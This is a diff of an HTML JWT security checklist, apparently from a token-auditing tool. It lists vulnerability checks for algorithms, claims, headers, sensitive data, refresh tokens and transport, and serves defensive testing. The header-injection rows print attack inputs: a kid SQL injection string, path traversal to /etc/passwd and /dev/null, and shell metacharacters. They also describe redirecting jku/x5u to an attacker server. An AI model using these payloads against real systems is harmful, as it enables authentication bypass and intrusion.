+        <tr data-risk="critical" data-text="algorithm confusion rs256 hs256 public key hmac secret asymmetric symmetric"><td class="check-icon">🔴</td><td><div class="check-name">Algorithm Confusion (RS256 → HS256)</div><div class="check-desc">If the server uses RS256, test by sending an HS256 token signed with the RSA public key. Vulnerable libraries may accept it, allowing full token forgery.</div><div class="check-ref">Ref: CVE-2016-5431 · PortSwigger Research</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="signature not verified decode only library misconfiguration"><td class="check-icon">🔴</td><td><div class="check-name">Signature Not Verified</div><div class="check-desc">Some implementations only base64-decode the JWT without verifying the signature. Send a token with a tampered payload and a random signature.</div><div class="check-ref">Ref: OWASP API Top 10 · RFC 7519 §7.2</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="empty signature truncated missing third part"><td class="check-icon">🔴</td><td><div class="check-name">Empty / Truncated Signature Accepted</div><div class="check-desc">Test if the server accepts tokens with an empty string as the signature field (header.payload.). The token format is technically valid but unsigned.</div><div class="check-ref">Ref: RFC 8725 §2.1 · jwt_tool tests</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="weak hmac secret brute force dictionary short secret password"><td class="check-icon">🔴</td><td><div class="check-name">Weak HMAC Secret (Brute-Forceable)</div><div class="check-desc">HMAC secrets under 256 bits or using dictionary words can be cracked offline using tools like hashcat in seconds. Test with the Secret Bruteforcer tab.</div><div class="check-ref">Ref: RFC 7518 §3.2 · NIST SP 800-107</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="null byte signature bypass padding confusion injection"><td class="check-icon">🔴</td><td><div class="check-name">Null Byte / Padding Injection in Signature</div><div class="check-desc">Some implementations may be vulnerable to null byte injection or Base64 padding confusion. Test with signatures ending in null bytes or extra padding characters.</div><div class="check-ref">Ref: Python-jwt CVE-2022-39227</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="high" data-text="weak algorithm hs256 symmetric short key bruteforce"><td class="check-icon">🟠</td><td><div class="check-name">Weak Algorithm: HS256</div><div class="check-desc">HS256 provides only 128-bit security level. Prefer HS512 (256-bit security), RS256, or ES256 for better resistance against brute-force.</div><div class="check-ref">Ref: RFC 7518 §3 · NIST SP 800-131A</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="alg none variants uppercase lowercase mixed case NONE nOnE NoNe"><td class="check-icon">🟠</td><td><div class="check-name">alg:none Case Variants</div><div class="check-desc">Test case variants: "None", "NONE", "nOnE", "NoNe". Some parsers may accept these as equivalent to "none" due to case-insensitive algorithm matching.</div><div class="check-ref">Ref: Tim McLean JWT security research</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="ps256 ps384 ps512 rsa pss algorithm confusion rs256"><td class="check-icon">🟠</td><td><div class="check-name">RSA-PSS Algorithm Confusion (PS256 → RS256)</div><div class="check-desc">If a server accepts both PS256 and RS256, test swapping between them. Malformed PSS signatures may be accepted by loose RSA verifiers.</div><div class="check-ref">Ref: RFC 7518 §3.5</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="algorithm downgrade es256 rs256 hs256 weaker attack"><td class="check-icon">🟡</td><td><div class="check-name">Algorithm Downgrade Attack</div><div class="check-desc">Verify the server does not allow downgrading from a stronger algorithm (ES256) to a weaker one (HS256) by modifying the alg header.</div><div class="check-ref">Ref: RFC 8725 §2.1 · OWASP JWT Cheat Sheet</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
       </table>
     </div>
 
-    <!-- P2: Claims -->
-    <div class="checklist-section">
-      <div class="checklist-section-title">
-        <span class="sev-badge sev-high">High</span>
-        Claims Validation
-      </div>
+    <!-- ② Claims Validation -->
+    <div class="checklist-section" data-section="Claims Validation">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> Claims Validation</div>
       <table class="checklist-table">
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">Missing exp Claim</div><div class="check-desc">Token never expires — remains valid indefinitely after issuance, critical risk if stolen.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">Expired Token Accepted</div><div class="check-desc">Verify the server rejects tokens whose exp timestamp has passed. Clock skew should be ≤60s.</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">Missing iss (Issuer) Claim</div><div class="check-desc">Without issuer validation, tokens from other systems may be accepted.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">Missing aud (Audience) Claim</div><div class="check-desc">Without audience validation, tokens for one service may be used against another (confused deputy).</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Missing jti (JWT ID) Claim</div><div class="check-desc">Without a unique ID, token revocation/blacklisting is impossible and replay attacks harder to detect.</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Missing sub (Subject) Claim</div><div class="check-desc">The sub claim should uniquely identify the token's subject (usually a user ID).</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">Token Not-Before (nbf) Abuse</div><div class="check-desc">Verify the server enforces the nbf claim — tokens should not be accepted before the not-before time.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">iat Issued-in-Future</div><div class="check-desc">A future-dated iat may indicate token manipulation or clock synchronization issues.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Excessive Token Lifetime (&gt;24h)</div><div class="check-desc">Long-lived tokens increase the impact window if a token is stolen. Prefer short-lived tokens with refresh.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Replay Attack Potential</div><div class="check-desc">Token lacks jti and has a long expiration — replay attacks are harder to detect without a unique ID.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="critical" data-text="missing exp expiration no expiry indefinite token stolen"><td class="check-icon">🔴</td><td><div class="check-name">Missing exp (Expiration) Claim</div><div class="check-desc">Token never expires — remains valid indefinitely. If stolen, attacker has permanent access. This is the most common critical JWT misconfiguration.</div><div class="check-ref">Ref: RFC 7519 §4.1.4 · OWASP A07:2021</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="high" data-text="expired token accepted server validation clock skew replay"><td class="check-icon">🔴</td><td><div class="check-name">Expired Token Accepted by Server</div><div class="check-desc">Verify the server actually rejects expired tokens. Clock skew tolerance should be ≤60 seconds. Test by replaying a known-expired token.</div><div class="check-ref">Ref: RFC 7519 §4.1.4 · RFC 8725 §3.9</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="missing iss issuer claim validation trusted authority unvalidated"><td class="check-icon">🟠</td><td><div class="check-name">Missing / Unvalidated iss (Issuer)</div><div class="check-desc">Without issuer validation, tokens from other systems or environments (prod token on dev) may be accepted. Validate against a strict whitelist.</div><div class="check-ref">Ref: RFC 7519 §4.1.1</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="missing aud audience claim confused deputy cross service unvalidated"><td class="check-icon">🟠</td><td><div class="check-name">Missing / Unvalidated aud (Audience)</div><div class="check-desc">Without audience validation, a token for service A can be replayed against service B. This is the "confused deputy" problem in microservices.</div><div class="check-ref">Ref: RFC 7519 §4.1.3 · RFC 8725 §2.4</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="missing jti jwt id revocation blacklist replay attack"><td class="check-icon">🟡</td><td><div class="check-name">Missing jti (JWT ID) Claim</div><div class="check-desc">Without a unique JWT ID, token revocation is impossible, making logout and credential rotation ineffective.</div><div class="check-ref">Ref: RFC 7519 §4.1.7</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="low" data-text="missing sub subject claim user identity principal"><td class="check-icon">🟡</td><td><div class="check-name">Missing sub (Subject) Claim</div><div class="check-desc">The sub claim should uniquely identify the token's principal. Its absence makes user attribution and authorization logic harder to implement securely.</div><div class="check-ref">Ref: RFC 7519 §4.1.2</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="medium" data-text="nbf not before claim enforcement future token activation"><td class="check-icon">🟠</td><td><div class="check-name">nbf (Not-Before) Not Enforced</div><div class="check-desc">Verify the server enforces the nbf claim. Pre-issued tokens (nbf in future) should be rejected until the activation time passes.</div><div class="check-ref">Ref: RFC 7519 §4.1.5</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="iat issued at future timestamp clock manipulation attack"><td class="check-icon">🟠</td><td><div class="check-name">iat Issued-in-Future</div><div class="check-desc">A future-dated iat may indicate token manipulation. Servers should reject tokens with iat more than 60 seconds ahead of server time.</div><div class="check-ref">Ref: RFC 7519 §4.1.6</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="excessive token lifetime 24h long lived access token window theft"><td class="check-icon">🟠</td><td><div class="check-name">Excessive Token Lifetime (&gt;24h)</div><div class="check-desc">Long-lived access tokens dramatically increase the impact window of token theft. Prefer ≤15 min for access tokens, ≤24h for refresh tokens.</div><div class="check-ref">Ref: OAuth 2.0 Security Best Practices §2.1.2</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="replay attack potential no jti long expiration reuse intercepted token"><td class="check-icon">🟠</td><td><div class="check-name">Replay Attack Potential</div><div class="check-desc">Token lacks a jti claim and has a long expiration — makes it trivial to replay intercepted tokens across sessions or services.</div><div class="check-ref">Ref: RFC 7519 §4.1.7 · OWASP Testing Guide</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="weak jwt id jti sequential predictable entropy randomness uuid"><td class="check-icon">🔵</td><td><div class="check-name">Weak / Predictable jti Value</div><div class="check-desc">A sequential or timestamp-only jti (e.g., "1", "1234567890") lacks sufficient uniqueness for reliable replay prevention.</div><div class="check-ref">Ref: RFC 7519 §4.1.7 · NIST SP 800-90A</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="medium" data-text="iss not validated cross tenant token reuse environment staging production"><td class="check-icon">🟠</td><td><div class="check-name">Cross-Tenant / Cross-Environment Token Reuse</div><div class="check-desc">Test if a production token is accepted in staging or if tokens from one tenant work for another. Proper iss + aud validation prevents this.</div><div class="check-ref">Ref: RFC 8725 §2.4 · Multi-tenant JWT security</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
       </table>
     </div>
 
-    <!-- P3: Header Injection -->
-    <div class="checklist-section">
-      <div class="checklist-section-title">
-        <span class="sev-badge sev-critical">Critical</span>
-        Header Injection &amp; Hijacking
-      </div>
+    <!-- ③ Header Injection & Hijacking -->
+    <div class="checklist-section" data-section="Header Injection and Hijacking">
+      <div class="checklist-section-title"><span class="sev-badge sev-critical">Critical</span> Header Injection &amp; Hijacking</div>
       <table class="checklist-table">
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">kid SQL Injection</div><div class="check-desc">The kid header may be passed to a DB query. Test: <code>kid: 1' OR '1'='1</code>. If key lookup is injectable, attacker can control signature verification.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">kid Path Traversal</div><div class="check-desc">If kid is used as a file path, test: <code>kid: ../../dev/null</code>. Allows bypassing signature verification using an empty key.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">kid Command Injection</div><div class="check-desc">If kid is passed to a shell command, special characters may lead to RCE.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">jku Header Injection (JWKS URL)</div><div class="check-desc">Verify the server validates the jku URL against a trusted whitelist. Malicious jku can redirect key verification to attacker-controlled server.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🔴</td><td><div class="check-name">x5u Header Injection</div><div class="check-desc">Similar to jku — the x5u header specifies a URL for X.509 certificate chain. Must validate against trusted domains only.</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">Embedded JWK in Header</div><div class="check-desc">Some libraries accept a jwk claim in the header to embed a key. Server should never use an embedded key for verification.</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">x5c Certificate Chain Injection</div><div class="check-desc">x5c embeds an X.509 certificate in the header. Validate the certificate chain against trusted roots.</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="critical" data-text="kid sql injection database query key lookup auth bypass"><td class="check-icon">🔴</td><td><div class="check-name">kid SQL Injection</div><div class="check-desc">If kid is interpolated into a DB query, inject: <code>kid: 1' OR '1'='1'--</code>. A successful injection lets attackers control which key is fetched, potentially returning a known/empty key.</div><div class="check-ref">Ref: PortSwigger JWT Labs · CVE research</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="kid path traversal file system dev null empty key bypass filesystem"><td class="check-icon">🔴</td><td><div class="check-name">kid Path Traversal</div><div class="check-desc">Test: <code>kid: ../../dev/null</code> or <code>kid: ../../../../etc/passwd</code>. If kid is used as a file path, returning empty or known content bypasses signature verification.</div><div class="check-ref">Ref: PortSwigger JWT Labs</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="kid command injection shell rce remote code execution metacharacter bash"><td class="check-icon">🔴</td><td><div class="check-name">kid Command Injection (RCE)</div><div class="check-desc">If kid is passed to a shell command for key retrieval, inject shell metacharacters. Special chars like <code>; | &amp; ` $( )</code> may trigger remote code execution.</div><div class="check-ref">Ref: OWASP Command Injection · CWE-78</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="jku jwks url injection attacker controlled server key fetch malicious"><td class="check-icon">🔴</td><td><div class="check-name">jku Header Injection (JWKS URL Hijack)</div><div class="check-desc">The jku header points to a JWKS endpoint. If the server fetches this URL without domain whitelisting, point it to an attacker-controlled server to return a self-generated key pair.</div><div class="check-ref">Ref: RFC 7515 §4.1.2 · PortSwigger JWT Labs</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="x5u header injection x509 certificate url attacker server chain"><td class="check-icon">🔴</td><td><div class="check-name">x5u Header Injection</div><div class="check-desc">x5u specifies a URL for an X.509 certificate chain. Without strict domain validation, redirect it to an attacker-controlled certificate to forge tokens.</div><div class="check-ref">Ref: RFC 7515 §4.1.5 · RFC 8725 §3.9</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="high" data-text="embedded jwk header key injection self signed forge trust"><td class="check-icon">🟠</td><td><div class="check-name">Embedded JWK in Header (Self-Signed)</div><div class="check-desc">Some libraries accept a <code>jwk</code> header parameter containing an embedded key and use it for verification. Attackers can embed their own public key to forge tokens signed with the matching private key.</div><div class="check-ref">Ref: CVE-2018-0114 · RFC 8725 §3.9</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="x5c certificate chain injection self signed root ca embedded header"><td class="check-icon">🟠</td><td><div class="check-name">x5c Certificate Chain Injection</div><div class="check-desc">The x5c header embeds a certificate chain. If the server trusts embedded certificates without validating against trusted root CAs, an attacker can supply self-signed certs.</div><div class="check-ref">Ref: RFC 7515 §4.1.6 · RFC 8725 §3.9</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="kid jku ssrf server side request forgery internal network fetch probe"><td class="check-icon">🟠</td><td><div class="check-name">kid / jku SSRF (Server-Side Request Forgery)</div><div class="check-desc">Even if the attacker cannot control the key returned, jku or x5u pointing to internal IPs can be used to probe internal network services via SSRF.</div><div class="check-ref">Ref: OWASP SSRF · CWE-918</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="cty content type header injection nested jwt parsing double decode"><td class="check-icon">🟡</td><td><div class="check-name">cty (Content Type) Header Misuse</div><div class="check-desc">The cty header (e.g., <code>cty: JWT</code>) signals nested JWTs. If not expected, servers parsing nested structures may be tricked into double-decoding, leading to claim injection.</div><div class="check-ref">Ref: RFC 7519 §5.2</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="typ header manipulation JWT+AT DPoP misuse token type bypass"><td class="check-icon">🟡</td><td><div class="check-name">typ Header Manipulation</div><div class="check-desc">Changing the typ from <code>JWT</code> to <code>JWT+AT</code> or omitting it may bypass token type checks in some implementations. Validate the typ header explicitly.</div><div class="check-ref">Ref: RFC 9068 · OAuth 2.0 Access Token JWT</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
       </table>
     </div>
 
-    <!-- P4: Sensitive Data -->
-    <div class="checklist-section">
-      <div class="checklist-section-title">
-        <span class="sev-badge sev-medium">Medium</span>
-        Sensitive Data &amp; Information Disclosure
-      </div>
+    <!-- ④ Sensitive Data & PII -->
+    <div class="checklist-section" data-section="Sensitive Data and Information Disclosure">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> Sensitive Data &amp; Information Disclosure</div>
       <table class="checklist-table">
-        <tr><td class="check-icon">🟠</td><td><div class="check-name">Sensitive Data in Payload</div><div class="check-desc">JWT payload is base64-encoded, NOT encrypted. Never include passwords, SSNs, credit cards, or PII directly.</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Excessive Claims / Over-Privilege</div><div class="check-desc">Review role/permission claims for over-privilege. Never trust client-supplied privilege escalation.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Internal System Info in Claims</div><div class="check-desc">Avoid leaking internal hostnames, DB names, or architecture details in JWT claims.</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Email / Username Exposed</div><div class="check-desc">PII like email or username in JWT can be read by any party that intercepts or stores the token.</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="high" data-text="sensitive data payload base64 not encrypted password ssn credit card pii"><td class="check-icon">🟠</td><td><div class="check-name">Sensitive PII in Payload</div><div class="check-desc">JWT payload is only base64url-encoded — not encrypted. Passwords, SSNs, credit card numbers, health data, or government IDs must never appear in JWT claims.</div><div class="check-ref">Ref: GDPR Article 32 · OWASP Data Exposure</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="excessive claims over privilege role admin permission escalation least privilege"><td class="check-icon">🟠</td><td><div class="check-name">Over-Privileged Role / Permission Claims</div><div class="check-desc">Inspect role and permission claims for excessive privileges. A token claiming "admin" or "superuser" is a high-value target. Apply least-privilege principle.</div><div class="check-ref">Ref: OWASP A01:2021 · PoLP</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="internal system info hostname database architecture leak recon"><td class="check-icon">🔵</td><td><div class="check-name">Internal System Metadata in Claims</div><div class="check-desc">Claims like <code>db_host</code>, <code>internal_id</code>, <code>shard</code>, or service names reveal internal architecture — valuable for attackers during reconnaissance.</div><div class="check-ref">Ref: OWASP API3:2023 Property Level Authorization</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="low" data-text="email username pii exposed readable third party token intercept logs"><td class="check-icon">🔵</td><td><div class="check-name">Email / Username Exposed in Claims</div><div class="check-desc">Email and username in JWT claims are readable by any party that holds or intercepts the token — including client-side JavaScript, proxy logs, and CDN access logs.</div><div class="check-ref">Ref: OWASP API3 · GDPR Article 25</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="medium" data-text="token in url query parameter logs access server browser history referrer"><td class="check-icon">🟠</td><td><div class="check-name">Token Exposed in URL / Query Parameters</div><div class="check-desc">JWTs passed as URL parameters appear in server logs, browser history, Referer headers, and analytics tools — all unintended disclosures of credential material.</div><div class="check-ref">Ref: RFC 6750 §5.3 · OWASP JWT Cheat Sheet</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="debugging claims test environment version build info metadata production"><td class="check-icon">🔵</td><td><div class="check-name">Debug / Version Claims in Production</div><div class="check-desc">Claims like <code>debug: true</code>, <code>env: staging</code>, or <code>version: 1.2.3</code> should never appear in production tokens — they reveal environment details to attackers.</div><div class="check-ref">Ref: CWE-200 Information Exposure</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="high" data-text="long lived refresh token stored localStorage insecure client storage xss"><td class="check-icon">🟠</td><td><div class="check-name">Long-Lived Token in Insecure Client Storage</div><div class="check-desc">Refresh tokens stored in localStorage or sessionStorage are accessible to JavaScript and vulnerable to XSS-based theft. Use HttpOnly cookies instead.</div><div class="check-ref">Ref: OWASP A02:2021 · Web Storage Risks</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
       </table>
     </div>
 
-    <!-- P5: Impl Best Practices -->
-    <div class="checklist-section">
-      <div class="checklist-section-title">
-        <span class="sev-badge sev-low">Low</span>
-        Implementation Best Practices
-      </div>
+    <!-- ⑤ Refresh Token Security -->
+    <div class="checklist-section" data-section="Refresh Token Security">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> Refresh Token Security</div>
       <table class="checklist-table">
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Algorithm Whitelist Enforced</div><div class="check-desc">Server should maintain an explicit whitelist of allowed algorithms (e.g., only RS256). Never allow "any".</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Secret Entropy ≥ 256-bit</div><div class="check-desc">HMAC secrets must be at least 32 random bytes (256 bits), generated by a CSPRNG.</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">HTTPS Only Token Transmission</div><div class="check-desc">Tokens should only be transmitted over HTTPS. Never expose in URLs (query params, paths).</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Secure Cookie Storage</div><div class="check-desc">If using cookies: HttpOnly, Secure, SameSite=Strict flags should all be set to prevent XSS theft.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Token Revocation / Blacklist</div><div class="check-desc">Implement a jti-based token revocation list for logout and compromised credential scenarios.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Key Rotation Policy</div><div class="check-desc">Define and implement a key rotation schedule. Old keys should be retired after rotation.</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Rate Limiting on Token Endpoints</div><div class="check-desc">Apply rate limiting to token issuance and verification endpoints to prevent brute-force attacks.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Unique jti per Token</div><div class="check-desc">jti (JWT ID) should use UUID v4 or CSPRNG — not sequential IDs or timestamps alone.</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Clock Skew Tolerance ≤ 60s</div><div class="check-desc">Allow at most 60 seconds of clock skew for exp/nbf validation to prevent manipulation.</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
-        <tr><td class="check-icon">🟡</td><td><div class="check-name">Payload Encryption (JWE) for PII</div><div class="check-desc">For sensitive payloads, use JSON Web Encryption (JWE / RFC 7516) instead of plain JWT.</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="high" data-text="refresh token rotation reuse detection one time use single use invalidate"><td class="check-icon">🟠</td><td><div class="check-name">Refresh Token Rotation Not Enforced</div><div class="check-desc">Each refresh token should be single-use. Rotate and invalidate the old token on every use. Detect and alert on reuse — it may signal theft.</div><div class="check-ref">Ref: OAuth 2.0 Security BCP §2.2.2</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="refresh token never expires indefinite long lived permanent access"><td class="check-icon">🟠</td><td><div class="check-name">Refresh Token Never Expires</div><div class="check-desc">Refresh tokens without expiration grant permanent access. Set absolute expiration (e.g., 90 days) and idle timeout (e.g., 14 days inactivity).</div><div class="check-ref">Ref: OAuth 2.0 Security BCP §2.2 · NIST 800-63B</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="refresh token binding client ip device fingerprint scope unbound"><td class="check-icon">🟡</td><td><div class="check-name">Refresh Token Not Bound to Client</div><div class="check-desc">Refresh tokens should be bound to the client (client_id, device fingerprint, or DPoP key). An unbound refresh token stolen from storage can be used from any device.</div><div class="check-ref">Ref: RFC 9449 DPoP · OAuth 2.0 Security BCP §2.2</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="refresh token scope escalation privilege elevation access token broader"><td class="check-icon">🟡</td><td><div class="check-name">Refresh Token Scope Escalation</div><div class="check-desc">Verify the server does not issue access tokens with broader scopes than the original refresh token's scope. Test by modifying scope in refresh requests.</div><div class="check-ref">Ref: RFC 6749 §6 · OAuth 2.0 Security BCP</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="high" data-text="refresh tokens stored plaintext database log server side hashing"><td class="check-icon">🟠</td><td><div class="check-name">Refresh Tokens Stored Plaintext Server-Side</div><div class="check-desc">Store only hashed refresh tokens (e.g., SHA-256) server-side. If the database is compromised, plaintext refresh tokens provide immediate unauthorized access.</div><div class="check-ref">Ref: OWASP Auth Cheat Sheet</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="refresh token logout revocation not working invalidation session end"><td class="check-icon">🟡</td><td><div class="check-name">Refresh Token Not Revoked on Logout</div><div class="check-desc">Verify that logging out invalidates all associated refresh tokens server-side. Test by attempting to use a refresh token after logout.</div><div class="check-ref">Ref: RFC 7009 Token Revocation · OAuth 2.0 BCP</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑥ Transport & Storage Security -->
+    <div class="checklist-section" data-section="Transport and Storage Security">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> Transport &amp; Storage Security</div>
+      <table class="checklist-table">
+        <tr data-risk="high" data-text="https tls only token transmission plaintext http man in middle intercept"><td class="check-icon">🟠</td><td><div class="check-name">HTTPS Not Enforced</div><div class="check-desc">Tokens must only be transmitted over TLS 1.2+. HSTS should be configured. Never send tokens over HTTP — they can be intercepted by passive listeners.</div><div class="check-ref">Ref: RFC 6750 §5.3 · RFC 8446 TLS 1.3</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="cookie httponly secure samesite csrf xss theft storage flag missing"><td class="check-icon">🟠</td><td><div class="check-name">Cookie Missing Security Flags</div><div class="check-desc">If storing JWT in cookies, all three flags are required: <code>HttpOnly</code> (prevents XSS theft), <code>Secure</code> (HTTPS only), <code>SameSite=Strict</code> (prevents CSRF).</div><div class="check-ref">Ref: RFC 6265bis · OWASP CSRF Prevention</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="localstorage sessionstorage xss token theft javascript accessible insecure"><td class="check-icon">🟠</td><td><div class="check-name">Token Stored in localStorage / sessionStorage</div><div class="check-desc">Tokens stored in Web Storage are accessible to any JavaScript on the page. A single XSS vulnerability leads to token theft. Use HttpOnly cookies instead.</div><div class="check-ref">Ref: OWASP XSS Prevention · Auth0 Security Guide</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="token leaked referrer access logs cdn analytics third party url"><td class="check-icon">🟡</td><td><div class="check-name">Token Leaked in Referrer / Access Logs</div><div class="check-desc">Tokens in URLs appear in server access logs, CDN logs, Referrer headers, and third-party analytics — all unintended disclosures. Never put tokens in URLs.</div><div class="check-ref">Ref: RFC 6750 §5.3 · CWE-598</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="service worker cache token intercept progressive web app pwa"><td class="check-icon">🟡</td><td><div class="check-name">Token Cached by Service Worker</div><div class="check-desc">Service workers can intercept and cache API responses including Authorization headers. Verify tokens are not inadvertently cached in service worker caches.</div><div class="check-ref">Ref: OWASP PWA Security · Service Worker Security</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
